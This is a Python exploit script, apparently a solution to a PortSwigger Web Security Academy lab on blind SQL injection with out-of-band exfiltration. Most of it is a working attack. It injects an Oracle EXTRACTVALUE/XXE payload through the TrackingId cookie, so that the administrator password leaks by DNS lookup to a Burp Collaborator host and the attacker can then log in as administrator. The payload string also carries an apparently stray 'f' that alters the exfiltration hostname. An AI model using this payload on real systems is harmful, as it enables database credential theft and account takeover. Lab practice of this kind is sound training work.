#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 27/9/2023
#
# Lab: Blind SQL injection with out-of-band data exfiltration
#
# Steps: 1. Inject payload into 'TrackingId' cookie to extract administrator password
#           via DNS lookup
#        2. Get the administrator password from your burp collaborator
#        3. Login as administrator
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0a85004d03d9728e81a82660004800b8.web-security-academy.net"

# change this to your burp collaborator
collaborator = "3x1jnir1jh7qmreed3zzphicf3lu9kx9.oastify.com"

print(Fore.BLUE + "[#] Injection point: " + Fore.YELLOW + "TrackingId")

# payload to extract administrator password via DNS lookup
payload = f"'||(SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM \"http://'||(select password from users where username = 'administrator')||'.f{collaborator}/\"> %25remote%3b]>'),'/l') FROM dual)-- -"

# set trackingId cookie
cookies = {
    'TrackingId': payload
}

try:  
    # extract administrator password via DNS lookup
    dns_lookup = requests.get(f"{url}/filter?category=Pets", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

# if the response is OK after making the DNS lookup
if dns_lookup.status_code == 200:
    print(Fore.WHITE + "[*] Injecting payload to extract administrator password via DNS lookup.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "[#] Check your burp collaborator for the administrator password then login")

else:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload")

